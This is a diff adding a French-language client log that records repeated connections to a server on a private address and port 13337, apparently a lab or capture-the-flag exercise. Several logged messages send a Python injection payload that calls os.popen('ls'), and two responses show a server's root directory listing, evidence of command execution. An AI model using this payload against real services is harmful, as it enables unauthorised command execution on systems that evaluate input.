@@ -1,0 +1,101 @@
+2024-10-24 11:11:37 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:11:37 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:11:57 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:13:11 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:13:12 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:15:06 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:15:06 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:15:10 INFO Message envoyé au serveur 10.33.66.78 : 1+1
+2024-10-24 11:15:10 INFO Réponse reçue du serveur 10.33.66.78 : b'2'
+2024-10-24 11:37:27 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:38:00 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:38:07 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:38:24 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:38:52 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:38:56 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:39:13 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:39:41 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:39:48 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:40:28 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:41:47 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:46:11 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:46:11 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:46:18 INFO Message envoyé au serveur 10.33.66.78 : 1+1
+2024-10-24 11:46:18 INFO Réponse reçue du serveur 10.33.66.78 : b'2'
+2024-10-24 11:46:23 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:46:23 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:46:47 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:46:47 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:46:53 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:46:53 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:51:10 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:51:10 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 11:51:12 INFO Message envoyé au serveur 10.33.66.78 : 1+1
+2024-10-24 11:51:13 INFO Réponse reçue du serveur 10.33.66.78 : b'2'
+2024-10-24 11:51:18 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:51:24 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:54:58 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:54:58 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:04 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:04 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:38 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:38 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:39 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:39 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:39 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:39 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:40 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:40 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:41 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:41 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:41 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:42 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:42 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:42 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:43 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:43 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:43 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:43 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:56:52 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:56:52 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:58:27 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:58:27 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 11:58:47 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 11:58:54 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 11:59:02 INFO Message envoyé au serveur 10.33.66.78 :  ls 
+2024-10-24 11:59:02 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:00:19 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:00:19 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:00:23 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:00:23 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:01:16 INFO Message envoyé au serveur 10.33.66.78 : ip a
+2024-10-24 12:01:16 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:01:20 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:01:20 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:01:25 INFO Message envoyé au serveur 10.33.66.78 : ip a
+2024-10-24 12:01:25 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:01:31 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:01:32 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:01:35 INFO Message envoyé au serveur 10.33.66.78 : feur
+2024-10-24 12:01:35 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:02:21 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:02:21 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:04:14 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:17:28 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:17:28 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:18:30 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:18:30 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:18:30 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('ls').read()
+2024-10-24 12:18:30 INFO Réponse reçue du serveur 10.33.66.78 : b'afs\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n'
+2024-10-24 12:22:52 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:24:08 ERROR Impossible de se connecter au serveur 10.33.66.78 sur le port 13337
+2024-10-24 12:26:28 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:26:59 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-24 12:26:59 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('ls').read()
+2024-10-24 12:26:59 INFO Réponse reçue du serveur 10.33.66.78 : b'afs\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n'
+2024-10-24 12:27:20 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:27:22 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:27:22 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('ls').read()
+2024-10-24 12:27:22 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-24 12:27:41 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-24 12:30:44 INFO Connexion réussie à 10.33.66.78:13337
